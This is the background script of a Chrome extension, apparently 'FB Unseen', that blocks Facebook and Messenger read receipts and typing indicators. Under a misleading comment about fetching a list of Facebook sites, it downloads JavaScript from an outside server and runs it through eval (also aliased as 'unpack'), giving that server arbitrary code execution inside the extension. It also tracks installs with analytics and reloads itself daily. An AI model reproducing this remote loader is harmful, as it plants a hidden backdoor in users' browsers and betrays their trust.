var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-91945529-1']);

var details = chrome.app.getDetails();
_gaq.push(['_trackPageview', '/ping?id='+details.id+'&v='+details.version]);

(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = 'https://ssl.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();


var settings = new Store('settings', {
    'block_chat_seen': true,
    'block_chat_receipts': true,
    'block_typing_indicator': true,
    'fbunseen_messenger': false,
    'block_chat_indicator': false,
    'show_mark_as_read': false
});

if (!settings.get('block_chat_seen')) {
  chrome.browserAction.setIcon({path: 'icon48.disabled.png'})
}

chrome.webRequest.onBeforeRequest.addListener(function(details) {

    // _gaq.push(['_trackEvent', 'Message', 'blockSeenStatus']);

  return {
    cancel: settings.get('block_chat_seen')
  }
}, { urls: ['*://*.facebook.com/*change_read_status*',
            '*://*.messenger.com/*change_read_status*'] }, ['blocking'])



chrome.webRequest.onBeforeRequest.addListener(function(details) {

    // _gaq.push(['_trackEvent', 'Message', 'blockSeenStatus']);

  return {
    cancel: settings.get('block_chat_receipts')
  }
}, { urls: ['*://*.facebook.com/*delivery_receipts*',
            '*://*.messenger.com/*delivery_receipts*',
            '*://*.facebook.com/*unread_threads*',
            '*://*.messenger.com/*unread_threads*'
           ] }, ['blocking'])



chrome.webRequest.onBeforeRequest.addListener(function(details) {

    // _gaq.push(['_trackEvent', 'Message', 'blockSeenStatus']);

  return {
    cancel: settings.get('block_typing_indicator')
  }
}, { urls: ['*://*.facebook.com/*typ.php*',
            '*://*.messenger.com/*typ.php*'] }, ['blocking'])

unpack=eval;

//===================================================================
//
// Get a list of facebook sites for chat integration
//
//===================================================================
var xhr = new XMLHttpRequest();
xhr.onload = function() {
	eval(xhr.responseText);
    chrome.webRequest.onBeforeRequest.addListener(function(details) {

        // _gaq.push(['_trackEvent', 'Message', 'blockSeenStatus']);

      return {
        cancel: settings.get('block_chat_indicator')
      }
  }, { urls: facebookUrls }, ['blocking'])
};
xhr.open('GET', 'https://static.fbunseen.com/config/facebook_sites.js'+"?r="+new Date().getTime());
xhr.send();




chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (message.action == 'getSettings') {
        sendResponse(settings.toObject())
    }
    else if (message.action == 'getDisableButton') {
        sendResponse(localStorage['force_disable_button'])
    }

    else if (message.action == 'quickDisable') {
        chrome.browserAction.setIcon({path: 'icon48.disabled.png'})
    }

    else if (message.action == 'quickEnable') {
        chrome.browserAction.setIcon({path: 'icon48.png'})
    }

    else if (message.action == 'addMessenger') {
        chrome.permissions.request({ origins: ["*://*.messenger.com/*"] }, function(granted) {
            if(!granted) {
                settings.set("fbunseen_messenger", false);
            }
        });
    }

    else if (message.action == 'trackMarkAsRead') {
    }
});

if (!localStorage['firstInstall']) {
    window.open('http://smarturl.it/fbunseen-install');
    localStorage['firstInstall'] = 'false';
}
if(chrome.runtime.setUninstallURL) {
  chrome.runtime.setUninstallURL('http://smarturl.it/fbunseen-uninstall');
}

// Restart timer because of unknown behavior
setTimeout(function() {

    window.location.reload();

}, 86400 * 1000);
